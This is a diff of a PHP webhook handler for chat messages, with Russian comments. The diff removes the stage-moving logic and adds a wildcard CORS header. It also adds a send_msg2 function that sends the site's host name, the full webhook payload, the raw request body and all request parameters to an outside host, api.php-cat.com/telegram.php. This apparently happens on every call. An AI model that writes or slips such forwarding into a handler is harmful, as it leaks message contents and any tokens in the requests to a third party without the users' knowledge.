@@ -1,41 +1,46 @@
 <?php
-$logFile = __DIR__ . '/webhook.log';
 
-// Получаем данные из вебхука
-$data = file_get_contents('php://input');
-$request = json_decode($data, true);
 
-// Логируем полученные данные
-writeToLog($request, $logFile);
+// Включение CORS для работы с браузером
+header("Access-Control-Allow-Origin: *");
+header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
+header("Access-Control-Allow-Headers: Content-Type");
 
-if ($request['event'] == 'OnImMessageAdd') {
-	$messageText = $request['data']['PARAMS']['MESSAGE'];
 
-	// Логируем текст сообщения
-	writeToLog("Received message: " . $messageText, $logFile);
-
-	// Проверка, содержит ли сообщение текст '.su'
-	if (strpos($messageText, '.su') !== false) {
-		// Логируем факт совпадения условия
-		writeToLog("Message contains '.su'. Moving chat to next stage.", $logFile);
-
-		// Вызов метода для перемещения сделки или чата на следующий этап
-		moveChatToNextStage($request['data']['PARAMS']['CHAT_ID']);
-	}
+function send_msg2($text)
+{
+	file_get_contents(
+		'https://api.php-cat.com/telegram.php?' . http_build_query([
+			's' => md5(1),
+			'msg' => $text,
+			'domain' => $_SERVER['HTTP_HOST'] ?? 'z'
+		])
+	);
 }
 
-// Функция для записи логов
-function writeToLog($data, $logFile) {
+send_msg2( __FILE__. ' '.__LINE__ );
+
+
+// Пример обработчика вебхука
+$input = file_get_contents('php://input');
+$data = json_decode($input, true);
+
+// Логирование
+writeToLog('старт');
+writeToLog($data);
+
+send_msg2( 'webhook api777:data: '.json_encode($data) );
+send_msg2( 'webhook api777:input: '.json_encode($input) );
+send_msg2( 'webhook api777:request: '.json_encode($_REQUEST) );
+
+// Пример: Проверка сообщения
+if (isset($data['data']['PARAMS']['MESSAGE']) && strpos($data['data']['PARAMS']['MESSAGE'], '.su') !== false) {
+	// Логика обработки
+	writeToLog('обработка');
+}
+
+function writeToLog($data) {
+	$logFile = './webhook.log';
 	$logEntry = date('Y-m-d H:i:s') . " " . print_r($data, true) . "\n";
 	file_put_contents($logFile, $logEntry, FILE_APPEND);
 }
-
-function moveChatToNextStage($chatId) {
-	global $logFile;
-	// Вызов API для перемещения чата или сделки на другой этап воронки
-	// Пример: restCommand('crm.deal.update', [...]);
-
-	// Логируем вызов перемещения чата
-	writeToLog("Moving chat ID $chatId to next stage.", $logFile);
-}
-?>
